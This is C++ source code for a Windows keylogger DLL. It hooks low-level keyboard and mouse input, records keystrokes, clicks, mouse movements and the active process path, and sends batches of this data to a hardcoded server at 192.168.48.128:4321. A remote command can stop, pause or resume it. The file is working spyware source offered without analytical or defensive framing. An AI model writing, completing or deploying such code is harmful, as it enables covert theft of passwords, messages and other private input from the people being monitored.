#pragma comment(lib, "Ws2_32.lib")

#include <map>
#include <fstream>
#include <string>
#include <sstream>
#include <regex>
/* 
** DO NOT change the inclusion order !
** http://stackoverflow.com/questions/1372480/c-redefinition-header-files
*/
#include "Handling.h"
#include "Hardware.h"
#include <windows.h>

#define PACKET_SIZE		1000
#define IP_SERVER		"192.168.48.128"
#define PORT_SERVER		"4321"

static Handling json(IP_SERVER, PORT_SERVER);
static Hardware mouse(WH_MOUSE_LL);
static Hardware keyboard(WH_KEYBOARD_LL);

static CHAR		newPath[MAX_PATH]	= "";
static CHAR		curPath[MAX_PATH]	= "UNKNOWN";
static bool		logRun				= true;
static bool		prgmRun				= true;

bool setKeyloggerMode(std::string cmd)
{
	if (cmd == "stop")
		prgmRun = FALSE;
	else if (cmd == "unpause")
		logRun = TRUE;
	else if (cmd == "pause")
		logRun = FALSE;
	else
		return (FALSE);
	return (TRUE);
}

bool stockProcessName()
{
	HWND fg;
	DWORD pid;
	HANDLE hProcess;
	DWORD cchLen = MAX_PATH;

	if ((fg = GetForegroundWindow())) {
		GetWindowThreadProcessId(fg, &pid);
		if ((hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid))) {
			if (QueryFullProcessImageNameA(hProcess, 0, newPath, &cchLen)) {
				if (strcmp(newPath, curPath) != 0) {
					strcpy_s(curPath, newPath);
					json.putActiveProcess(curPath, "USELESS");
				}
				CloseHandle(hProcess);
				return true;
			}
			CloseHandle(hProcess);
		}
	}
	return false;
}

std::string getTime()
{
	time_t roxtime;
	struct tm	stime;

	time(&roxtime);
	gmtime_s(&stime, &roxtime);
	std::ostringstream strs(stime.tm_year % 100 + 2000);
	strs << (stime.tm_year % 100 + 2000)
		<< '-' << (stime.tm_mon)
		<< '-' << (stime.tm_mday)
		<< ' ' << (stime.tm_hour % 24)
		<< ':' << (stime.tm_min)
		<< " UTC";
	return strs.str();
}

static std::map<int, std::string> cor = 
{
	{8, "[BACKSPACE]"},		{27, "[ESC]"},
	{33, "[Page Up]"},		{34, "[Page Down]"},
	{35, "[END]"},			{36, "[HOME]"},
	{37, "[Arrow Left]"},	{38, "[Arrow Up]"},
	{39, "[Arrow Right]"},	{40, "[Arrow Down]"},
	{45, "[INSERT]"},		{46, "[DELETE]"},
	{91, "[L Windows Key]"},{92, "[R Windows Key]"},
	{93, "[R Menu]"},		{144, "[NUM LOCK]"},
	{222, "[ACUTE/CEDILLA]"}
};

extern "C" __declspec(dllexport)
LRESULT CALLBACK kbdHandler(int code, WPARAM wParam, LPARAM lParam) {
	if (logRun && code >= 0) {
		WORD buf;
		BYTE KeyState[256];
		char lpString[256];
		KBDLLHOOKSTRUCT *pKeyBoard;

		pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
		if (!keyboard.isWorking())
			keyboard.startWorking(getTime());
		GetKeyboardState(KeyState);
		if (wParam == WM_KEYDOWN) {
			if (cor.count(pKeyBoard->vkCode))
				keyboard.log(cor[pKeyBoard->vkCode]);
			else if (ToAscii(pKeyBoard->vkCode, MapVirtualKey(pKeyBoard->vkCode, 0), KeyState, &buf, 0) == 1)
				keyboard.log((char)buf);
			else if (GetKeyNameTextA(MAKELONG(0, MapVirtualKey(pKeyBoard->vkCode, 0)), lpString, 255) > 0)
				keyboard.log(std::string(lpString));
		}
	}
	if (logRun) {
		if (json.getSizeBuffer() >= PACKET_SIZE) {
			json.sendPackets();
			json.putActiveProcess(curPath, "USELESS");
		}
		if (!stockProcessName())
			json.putActiveProcess("UNKNOWN", "USELESS");
	}
	return (CallNextHookEx(keyboard.getHandler(), code, wParam, lParam));
}

extern "C" __declspec(dllexport)
LRESULT CALLBACK mouseHandler(int code, WPARAM wParam, LPARAM lParam) {
	if (logRun && code >= 0) {
		MSLLHOOKSTRUCT *pMouse = (MSLLHOOKSTRUCT *)lParam;
		if (wParam == WM_MOUSEMOVE) {
			if (!mouse.isWorking()) {
				mouse.setX(pMouse->pt.x);
				mouse.setY(pMouse->pt.y);
				mouse.startWorking(getTime());
			}
		}
		else if (mouse.isWorking()) {
			mouse.endWorking(getTime());
			json.putMouseMove(mouse.getX(), mouse.getY(), pMouse->pt.x, pMouse->pt.y, mouse.getStartTime());
			mouse.reset();
		}
		if (keyboard.isWorking()) {
			keyboard.endWorking(getTime());
			json.putKeyboard(keyboard.getLog(), keyboard.getStartTime(), keyboard.getEndTime());
			keyboard.reset();
		}
		if (wParam == WM_RBUTTONDOWN)
			json.putMouseClick(pMouse->pt.x, pMouse->pt.y, "right", getTime());
		else if (wParam == WM_LBUTTONDOWN)
			json.putMouseClick(pMouse->pt.x, pMouse->pt.y, "left", getTime());
	}
	return (CallNextHookEx(mouse.getHandler(), code, wParam, lParam));
}

extern "C" __declspec(dllexport)
void initHook() {
	MSG		msg;
	
	json.sendStartUp();
	if (!stockProcessName())
		json.putActiveProcess("UNKNOWN", "USELESS");
	// Init the Hook in keyboard and mouse
	if (!keyboard.hook(kbdHandler))
		return;
	if (!mouse.hook(mouseHandler))
		return;
	
	// wait
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	// exit properly if you can
	keyboard.unHook();
	mouse.unHook();
	return;
}
